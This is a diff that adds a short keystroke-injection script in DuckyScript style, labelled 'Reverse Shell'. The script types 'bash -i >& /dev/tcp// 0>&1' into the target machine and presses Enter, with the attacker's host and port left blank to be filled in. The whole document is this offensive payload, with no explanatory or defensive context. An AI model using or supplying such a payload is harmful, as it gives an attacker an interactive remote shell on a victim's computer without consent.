@@ -1,0 +1,6 @@
+REM Reverse Shell (set  and )
+
+STRING bash -i >& /dev/tcp// 0>&1
+
+ENTER
+
